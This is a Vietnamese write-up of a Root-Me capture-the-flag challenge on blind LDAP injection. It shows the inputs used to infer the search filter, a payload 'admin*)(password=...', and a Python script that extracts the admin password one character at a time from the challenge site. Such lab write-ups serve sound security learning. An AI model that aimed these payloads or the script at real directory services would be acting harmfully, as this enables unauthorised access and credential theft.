# LDAP injection - Blind (Hard - 55 pts)

Lỗ hổng xảy ra ở: http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=

Ở đây sẽ thực hiện tìm kiếm một account dựa trên email.

Để kiểm chứng điều này mình sẽ ví dụ:

Account bên dưới có sn là jsmith và email là j.smith@ch26.challenge01.root-me.org

![image](https://user-images.githubusercontent.com/83667873/151546619-6a56934f-a472-4e84-9850-f43824952b5d.png)

Khi mình nhập thông tin tìm kiếm là "js" kết quả tìm kiếm không hiển thị

Nhưng khi mình nhập thông tin tìm kiếm là j.s thì kết quả hiện thị ra thông tin của account trên, mà j.s chỉ xuất hiện trong email chứng tỏ ở đây người ta thực hiện tìm kiếm theo email.

Giờ mình có thể suy ra được cú phát câu query có dạng:

```
(operotor(email=*input*) 
```

*Với operator có thể là AND (&), OR (|), not (!)

Tiếp theo mình sẽ kiểm tra xem operator được sử dụng là gì

Mình sẽ nhập vào input:

```
j*)(cn=j
```

khi này câu query sẽ trở thành dạng:

```
(operator(email=*j*)(cn=j*))
```

Với câu query này thì kết quả là thành công

Khi mình thay input thành:

```
j*)(cn=js
```
Khi thay thành js thì chỉ có cn thỏa mà email không thỏa và cho ra 0 kết quả tìm kiếm chứng tỏ operator đang sử dụng là &

Vậy cú phát tìm kiếm có thể là:
```
(&(email=*input*))
```
Giờ chúng ta chỉ cần thực hiện tương tự như trên để thực hiện tìm password của admin:

```
admin*)(password=somthing
```
Solve code:

```
import requests
import string

url = 'http://challenge01.root-me.org/web-serveur/ch26/'
charlist = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

def findPass():
	password = ''
	while True:
		for i in charlist:
			r = requests.get(url+'?action=dir&search=admin*)(password='+password+i)
			if "admin" in r.text:
				password += i
				print(password)
				break
		else:
			break
	return password

def main():
	print("[+] Found admin's password: ", findPass())

if __name__=="__main__":
	main()
```

Kết quả:

![image](https://user-images.githubusercontent.com/83667873/151564753-be811fdc-acba-43f0-be1e-a3ca6ad5c452.png)

![image](https://user-images.githubusercontent.com/83667873/151564863-bb9207db-b113-45e1-aded-00c3b145613b.png)

